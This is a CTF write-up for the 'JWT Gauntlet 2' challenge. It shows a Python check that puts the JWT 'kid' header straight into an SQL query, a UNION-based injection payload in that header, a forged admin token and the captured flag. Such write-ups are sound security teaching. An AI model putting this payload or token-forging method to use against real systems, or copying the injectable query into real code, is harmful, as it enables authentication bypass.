# JWT Gauntlet 2 Writeup

### Disclaimer
This challenge is a sequal to `JWT Gauntlet 1` and `JWT Gauntlet 1`, so this writeup will assume you have read the writeups for them

### Writeup

The website looks the same as normal, but the description mentioned using a database, instead of grabbing files so it is possible that the secret key for the JWT token is stored in a database of some sort.

Going to the website yet again, it looks the same and grabbing the session token doesn't reveal anything, except that the `kid` is now an integer instead of a file path

```txt
session: eyJhbGciOiJIUzI1NiIsImtpZCI6IjEyMzQ1IiwidHlwIjoiSldUIn0.eyJhZG1pbiI6ZmFsc2V9.OqDdUhsEsTSTt3l9CKl-IIqjbHSuBiJoo7iChrgyq3M
```

Decoding it (`jwt.io`)
```json
{
  "alg": "HS256",
  "kid": "12345",
  "typ": "JWT"
}
{
  "admin": false
}
```

So the only thing left to try is grab the `app.pyi`, this file reveals the change, instead of the `kid` header being a path to a file, it is instead a identifier for a key in a database, and based on how the kid is `12345`, and not `1` or `2`, each key likely has a unique `kid`, and not some incremented value.

The `is_admin` function yet again reveals the vulnerability

```python
def is_admin(request) -> bool:
    token = request.cookies.get("session")
    if token is None:
        return False

    try:
        header = jwt.get_unverified_header(token)
        kid = header["kid"]

        output = []

        try:
            conn = sqlite3.connect("data.db")
            cursor = conn.cursor()
            cursor.execute(f"""
                SELECT value FROM keys WHERE kid = '{kid}';
                """)
            output = cursor.fetchall()
            conn.close()
        except:
            return False

        if output == []:
            return False

        data = jwt.decode(token, output[0][0], algorithms=["HS256"])
        return data.get("admin", False)
    except:
        return False

```

The SQL query includes unsanitised user input, and then uses whatever returns from the query as the secret key to verify the JWT with, so if we can SQL inject and return a custom value decided by us, then we can forge any JWT token that we want.

A valid value that would work is if we set the kid to be:
```SQL
zzz' UNION SELECT '1';--
```

Opening `jwt.io` and using `JWT Encode` mode, we can do excatly that

```json
{
  "alg": "HS256",
  "kid": "zzz' UNION SELECT '1';--",
  "typ": "JWT"
}
{
  "admin": true
}
```

And sign with just the number `1`, this generates the JWT token:
```txt
eyJhbGciOiJIUzI1NiIsImtpZCI6Inp6eicgVU5JT04gU0VMRUNUICcxJzstLSIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6dHJ1ZX0.wfeibgzjSDfzWQFujPJXh-JW6Fx2f6a6LUMuuBJ6sBA
```

Setting out `session` token to this and reloading the page gets us the `Admin` button.

And yet again pressing it links to the flag page:
```
redroomctf{SQL_1nj3ct10n_1n_4_JWT_t0k3n?}
```
